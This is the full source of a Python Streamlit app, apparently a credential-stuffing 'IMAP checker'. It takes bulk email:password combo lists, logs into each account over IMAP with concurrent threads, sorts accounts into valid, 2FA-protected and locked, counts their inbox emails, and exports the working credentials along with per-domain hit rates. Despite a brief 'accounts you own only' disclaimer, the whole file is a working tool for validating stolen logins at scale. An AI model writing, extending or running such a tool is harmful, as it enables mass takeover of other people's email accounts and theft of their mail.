# ==================================================
# 🔒 PASSWORD PROTECTION — KEEP AT TOP
# ==================================================
import streamlit as st

APP_PASSWORD = "SpookzChecker9090"

if "authenticated" not in st.session_state:
    st.session_state.authenticated = False

if not st.session_state.authenticated:
    st.title("🔐 Enter Password")
    st.info("Enter your password to access the IMAP Checker.")
    input_pwd = st.text_input("Password", type="password")
    if st.button("🔑 Login"):
        if input_pwd == APP_PASSWORD:
            st.session_state.authenticated = True
            st.rerun()
        else:
            st.error("❌ Incorrect password — try again.")
    st.stop()

# ==================================================
# 📧 IMAP CHECKER — Inbox Counts + Domain Stats + 2FA/Unknown
# ==================================================

import imaplib
import time
import csv
import re
from io import StringIO
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed

# ⚙️ SETTINGS
MAX_WORKERS = 8
TIMEOUT = 15
DELAY_BETWEEN = 0.1

# 🔍 PARSE LINE
def parse_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    for sep in [":", "|", " "]:
        if sep in line:
            parts = line.split(sep, 1)
            if len(parts) == 2 and "@" in parts[0]:
                return {"email": parts[0].strip(), "password": parts[1].strip()}
    match = re.match(r'^([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)[\s:]+(.+)$', line)
    if match:
        return {"email": match.group(1), "password": match.group(2)}
    return None

# 📡 IMAP SERVER DETECTION
def get_imap_server(email):
    domain = email.split("@")[-1].lower()
    servers = {
        "gmail.com": ("imap.gmail.com", 993),
        "outlook.com": ("imap-mail.outlook.com", 993),
        "hotmail.com": ("imap-mail.outlook.com", 993),
        "yahoo.com": ("imap.mail.yahoo.com", 993),
        "yahoo.co.uk": ("imap.mail.yahoo.com", 993),
        "icloud.com": ("imap.mail.me.com", 993),
        "aol.com": ("imap.aol.com", 993),
        "mail.com": ("imap.mail.com", 993),
        "protonmail.com": ("127.0.0.1", 1143),
    }
    return servers.get(domain, ("imap." + domain, 993))

# 📊 EXTRACT DOMAIN
def get_domain(email):
    try:
        return email.split("@")[-1].lower()
    except:
        return "unknown"

# 🔎 CHECK FOR 2FA / LOCKED / UNKNOWN
def check_special_status(exception_msg, email):
    err = str(exception_msg).lower()
    if any(kw in err for kw in ["application-specific", "app password", "2fa", "two-factor", "verification", "suspicious", "unusual", "login attempt", "security check"]):
        return "🔒 2FA / App Password Required"
    if any(kw in err for kw in ["locked", "disabled", "suspended", "account unavailable", "access denied"]):
        return "🚫 Account Locked/Disabled"
    if any(kw in err for kw in ["too many", "rate limit", "busy", "try again later"]):
        return "⏳ Rate Limited"
    return None

# 📧 MAIN IMAP CHECK
def check_imap(account):
    email = account["email"]
    password = account["password"]
    host, port = get_imap_server(email)
    domain = get_domain(email)
    
    result = {
        "email": email,
        "password": password,
        "domain": domain,
        "status": "UNKNOWN",
        "note": "",
        "inbox_count": 0,
        "imap_server": host,
        "checked_at": time.strftime("%Y-%m-%d %H:%M:%S")
    }

    try:
        mail = imaplib.IMAP4_SSL(host, port, timeout=TIMEOUT)
        mail.login(email, password)
        
        # 📥 GET INBOX COUNT
        status, count = mail.select("INBOX", readonly=True)
        if status == "OK":
            result["inbox_count"] = int(count[0])
        
        mail.logout()
        result["status"] = "✅ VALID"
        result["note"] = f"✅ {result['inbox_count']} emails in inbox"

    except imaplib.IMAP4.error as e:
        special = check_special_status(e, email)
        if special:
            result["status"] = "🔒 2FA / SECURITY"
            result["note"] = special
        elif "authentication" in str(e).lower() or "invalid credentials" in str(e).lower():
            result["status"] = "❌ INVALID"
            result["note"] = "Bad credentials"
        else:
            result["status"] = "❌ FAILED"
            result["note"] = str(e)[:80]

    except TimeoutError:
        result["status"] = "⏱️ TIMEOUT"
        result["note"] = "Server did not respond"

    except Exception as e:
        result["status"] = "❓ UNKNOWN"
        result["note"] = str(e)[:80]

    time.sleep(DELAY_BETWEEN)
    return result

# --- PAGE SETUP ---
st.set_page_config(page_title="📧 IMAP Checker — Full Stats", layout="wide")
st.title("📧 IMAP Account Checker — Inbox Counts + Domain Stats + 2FA Capture")
st.markdown("""
**Format**: `email:password` — one per line.  
**Captures**: ✅ Valid (with inbox count) | 🔒 2FA/Security | ❌ Invalid | ❓ Unknown | ⏱️ Timeout
""")
st.info("⚠️ For accounts YOU own only. UK Computer Misuse Act applies.")

# --- INPUT: FILE UPLOAD + PASTE ---
tab1, tab2 = st.tabs(["📁 Upload TXT File", "📝 Paste Text"])
accounts = []

with tab1:
    st.subheader("Upload Accounts File")
    uploaded_file = st.file_uploader("Choose your .txt file", type="txt")
    if uploaded_file:
        content = uploaded_file.read().decode("utf-8", errors="ignore")
        lines = content.splitlines()
        for line in lines:
            acc = parse_line(line)
            if acc:
                accounts.append(acc)
        st.success(f"✅ Loaded **{len(accounts)}** accounts from file!")
        with st.expander("Preview accounts"):
            for a in accounts[:10]:
                st.code(f"{a['email']}:{a['password']}")
            if len(accounts) > 10:
                st.write(f"... and {len(accounts)-10} more")

with tab2:
    st.subheader("Paste Accounts Below")
    input_text = st.text_area(
        "email:password — one per line",
        height=200,
        placeholder="test@gmail.com:pass123\nhello@outlook.com:mypassword"
    )
    if input_text:
        lines = input_text.strip().split("\n")
        for line in lines:
            acc = parse_line(line)
            if acc:
                accounts.append(acc)
        if accounts:
            st.success(f"✅ Parsed **{len(accounts)}** accounts!")

# --- SETTINGS ---
st.divider()
col1, col2 = st.columns([2, 1])
with col1:
    max_workers = st.slider("Concurrent Checks", 1, 15, MAX_WORKERS)
with col2:
    start_btn = st.button("🚀 START CHECK", type="primary", use_container_width=True)

# --- RUN CHECKS ---
if start_btn:
    if not accounts:
        st.warning("⚠️ No accounts found! Upload a file or paste some first.")
        st.stop()

    total = len(accounts)
    st.info(f"🔍 Starting check of **{total}** accounts...")

    results_data = []
    start_time = time.time()

    progress_bar = st.progress(0)
    c1, c2, c3, c4, c5, c6 = st.columns(6)
    t_m = c1.empty(); v_m = c2.empty(); fa_m = c3.empty(); inv_m = c4.empty(); unk_m = c5.empty(); time_m = c6.empty()

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        results = list(executor.map(check_imap, accounts))

        for idx, result in enumerate(results):
            results_data.append(result)
            progress_bar.progress((idx + 1) / total)
            
            # Live counters
            valid_count = sum(1 for r in results_data if "✅ VALID" in r["status"])
            fa_count = sum(1 for r in results_data if "🔒" in r["status"])
            inv_count = sum(1 for r in results_data if "❌ INVALID" in r["status"] or "❌ FAILED" in r["status"])
            unk_count = sum(1 for r in results_data if "❓ UNKNOWN" in r["status"] or "⏱️" in r["status"])
            
            t_m.metric("Total", idx + 1)
            v_m.metric("✅ Valid", valid_count)
            fa_m.metric("🔒 2FA/Sec", fa_count)
            inv_m.metric("❌ Invalid", inv_count)
            unk_m.metric("❓ Other", unk_count)
            time_m.metric("Time", f"{round(time.time() - start_time, 1)}s")

    elapsed = round(time.time() - start_time, 1)
    st.success(f"✅ CHECK COMPLETE — {total} accounts in {elapsed}s")

    # --- 📊 DOMAIN BREAKDOWN ---
    st.subheader("📈 Domain Breakdown")
    domain_counts = Counter(r["domain"] for r in results_data)
    domain_valid = Counter(r["domain"] for r in results_data if "✅ VALID" in r["status"])
    
    domain_table = [
        {
            "Domain": domain,
            "Total Accounts": count,
            "Valid Accounts": domain_valid.get(domain, 0),
            "Hit Rate %": f"{round((domain_valid.get(domain, 0)/count)*100, 1)}%"
        }
        for domain, count in sorted(domain_counts.items(), key=lambda x: x[1], reverse=True)
    ]
    
    st.dataframe(domain_table, use_container_width=True, hide_index=True)

    # --- 📋 FULL RESULTS TABLE ---
    st.subheader("📋 All Results — Full Details")
    st.dataframe(
        results_data,
        column_config={
            "email": "Email",
            "password": "Password",
            "domain": "Domain",
            "status": "Status",
            "note": "Details",
            "inbox_count": "📥 Inbox Emails",
            "imap_server": "IMAP Server",
            "checked_at": "Checked At"
        },
        use_container_width=True,
        height=500
    )

    # --- 📥 EXPORT ALL FORMATS ---
    st.subheader("📥 Export Results — All Formats")
    col_a, col_b, col_c, col_d, col_e = st.columns(5)

    # 1. FULL CSV
    csv_full = StringIO()
    writer = csv.DictWriter(csv_full, fieldnames=["email","password","domain","status","note","inbox_count","imap_server","checked_at"])
    writer.writeheader()
    writer.writerows(results_data)
    col_a.download_button(
        "📂 Full CSV",
        data=csv_full.getvalue(),
        file_name=f"imap_full_{time.strftime('%Y%m%d_%H%M%S')}.csv",
        mime="text/csv",
        type="primary"
    )

    # 2. ✅ VALID ONLY — with inbox count
    valid_lines = [
        f"{r['email']}:{r['password']} | 📥 Inbox: {r['inbox_count']} emails | {r['domain']}"
        for r in results_data if "✅ VALID" in r["status"]
    ]
    col_b.download_button(
        "✅ Valid + Inbox Count",
        data="\n".join(valid_lines),
        file_name=f"imap_valid_{time.strftime('%Y%m%d_%H%M%S')}.txt",
        type="secondary"
    )

    # 3. 🔒 2FA / SECURITY ONLY
    fa_lines = [f"{r['email']}:{r['password']} | {r['note']} | {r['domain']}" for r in results_data if "🔒" in r["status"]]
    col_c.download_button(
        "🔒 2FA/Security",
        data="\n".join(fa_lines),
        file_name=f"imap_2fa_{time.strftime('%Y%m%d_%H%M%S')}.txt",
        type="secondary"
    )

    # 4. ❌ INVALID ONLY
    invalid_lines = [f"{r['email']}:{r['password']} | {r['domain']}" for r in results_data if "❌ INVALID" in r["status"] or "❌ FAILED" in r["status"]]
    col_d.download_button(
        "❌ Invalid",
        data="\n".join(invalid_lines),
        file_name=f"imap_invalid_{time.strftime('%Y%m%d_%H%M%S')}.txt",
        type="secondary"
    )

    # 5. ❓ UNKNOWN / TIMEOUT ONLY
    other_lines = [f"{r['email']}:{r['password']} | {r['status']} — {r['note']} | {r['domain']}" for r in results_data if "❓ UNKNOWN" in r["status"] or "⏱️" in r["status"] or "⏳" in r["status"]]
    col_e.download_button(
        "❓ Unknown/Other",
        data="\n".join(other_lines),
        file_name=f"imap_unknown_{time.strftime('%Y%m%d_%H%M%S')}.txt",
        type="secondary"
    )

elif start_btn is False:
    st.info("👆 Upload a .txt file OR paste your accounts above, then click START CHECK.")
